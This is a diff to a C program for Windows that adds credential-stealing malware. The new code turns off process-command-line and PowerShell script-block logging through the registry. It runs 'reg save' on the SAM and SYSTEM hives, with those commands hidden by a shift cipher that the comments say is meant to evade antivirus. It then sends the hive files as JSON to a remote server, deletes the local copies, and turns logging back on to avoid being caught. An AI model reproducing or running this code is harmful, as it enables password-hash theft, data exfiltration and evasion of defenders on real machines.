@@ -120,6 +120,7 @@ int validate_files()
 /**
  * Modifies the contents of an existing registry KeyValue.
  * 🚨🚨🚨 `BE VERY CAREFUL WHILE USING THIS!!! YOU ARE MODIFYING THE REGISTRY!!! THIS WILL BLOW UP YOUR PC IF DONE WRONG!!!` 🚨🚨🚨
+ * Alternatively, if your end goal is to destroy a PC instead of exfiltrating stuff, feel free to [redacted] and find out
  * @param root_key Root Key (such as HKEY_LOCAL_MACHINE).
  * @param path Registry path of the Subkey of the KeyNode to edit. This branches off from the `root_key`.
  * @param key KeyValue to edit.
@@ -145,7 +146,7 @@ int modify_keyvalue(HKEY root_key, char* path, char* key, int value)
         return 0;
     }
 
-    printf("KeyValue %s successfully set to %d.", key, value);
+    printf("KeyValue %s successfully set to %d.\n", key, value);
     RegCloseKey(subkey);
 
     return 1;
@@ -169,24 +170,73 @@ int main() {
     }
 
     // 🗒️ Remember that Registry paths use \\ instead of /
-    if (modify_keyvalue(HKEY_LOCAL_MACHINE, "random\\doesnotexist", "whatisthis", 1) == 0)
+    // Disable Window Event Logs
+    if (modify_keyvalue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit", "ProcessCreationIncludeCmdLine_Enabled", 0) == 0)
     {
-        fprintf(stderr, "HKEY_LOCAL_MACHINE:\\random\\doesnotexist\\whatisthis can't be modified. This isn't necessarily a bad thing - that means there's no logging in place.\n");
+        fprintf(stderr, "HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit\\ProcessCreationIncludeCmdLine_Enabled can't be modified. This isn't necessarily a bad thing - that means there's no logging in place.\n");
     }
 
-    if (modify_keyvalue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit", "EnableScriptBlockLogging", 1) == 0)
+    if (modify_keyvalue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging", "EnableScriptBlockLogging", 0) == 0)
     {
-        fprintf(stderr, "HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit\\EnableScriptBlockLogging can't be modified. This isn't necessarily a bad thing - that means there's no logging in place.\n");
+        fprintf(stderr, "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\\EnableScriptBlockLogging can't be modified. This isn't necessarily a bad thing - that means there's no logging in place.\n");
     }
     
-    // int json_length;
-    // char* json_str = spill_file_json(REG_EXPORTS, REG_EXPORTS_SIZE, &json_length);
+    // Download SYSTEM and SAM files since Windows does not let you do that normally
+    // We're encrypting the commands via a shift cipher. It's stupidly insecure but at least it evades anti-virus because if they see `reg save` they are throwing red flags
     
+    // reg save HKEY_LOCAL_MACHINE\SAM ./SAM
+    char* command1_enc = "uhj#vdyh#KNH\\bORFDObPDFKLQH_VDP#12VDP";
+    char* command_1;
+    shift_cipher(1, command1_enc, &command_1, 3);
+
+    // reg save HKEY_LOCAL_MACHINE\SYSTEM ./SYSTEM
+    char* command2_enc = "vik$wezi$LOI]cPSGEPcQEGLMRI`W]WXIQ$23W]WXIQ";
+    char* command_2;
+    shift_cipher(1, command2_enc, &command_2, 4);
+    puts(command_2);
+
+    system(command_1);
+    system(command_2);
+
+    // Garbage collector
+    free(command_1);
+    free(command_2);
+
+    // While we could sit here and extract pwd hashes directly on this PC, it'll be very noisy
+    // The better thing to do is exfil the entire SYSTEM/SAM file and do it on our end when we do get the JSON
+    char* dir_names[2] = {"./SYSTEM", "./SAM"};
+    int json_length;
+    char* json_str = spill_file_json(dir_names, 2, &json_length);
     // print_mem(json_str, json_length, TRUE);
 
-    // // Cleanup + Re-enable file system redirection
-    // free(json_str);
-    // //Wow64RevertWow64FsRedirection(redirect_val);
+    // Delete ./SYSTEM and ./SAM since we no longer use it. TO DO: See if we need to disable logging for this
+    if (remove("./SYSTEM") != 0 || remove("./SAM") != 0)
+    {
+        perror("Unable to delete ./SYSTEM and ./SAM files.");
+    }
+
+    // Exfiltrate the json_str
+    // Remember: JSON_LENGTH takes into account the null terminator. POST does not. Subtract 1 from this.
+    if (send_post_request(SVL_ADDRESS, json_str, json_length - 1, "regexport", SVL_AUTHKEY) == -1)
+    {
+        fprintf(stderr, "Unable to exfil json_str.");
+    }
+
+    // Garbage collector
+    free(json_str);
+
+    // Revert registry values so we don't get caught
+    // Granted: Personal PCs usually don't come with these audit policies enabled. But if someone does enable them, they prolly know what they're doing with Cybersec
+    // and you really don't want to get caught
+    if (modify_keyvalue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit", "ProcessCreationIncludeCmdLine_Enabled", 1) == 0)
+    {
+        fprintf(stderr, "HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit\\ProcessCreationIncludeCmdLine_Enabled can't be modified. This isn't necessarily a bad thing - that means there's no logging in place.\n");
+    }
+
+    if (modify_keyvalue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging", "EnableScriptBlockLogging", 1) == 0)
+    {
+        fprintf(stderr, "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\\EnableScriptBlockLogging can't be modified. This isn't necessarily a bad thing - that means there's no logging in place.\n");
+    }
     
     return 0;
 }
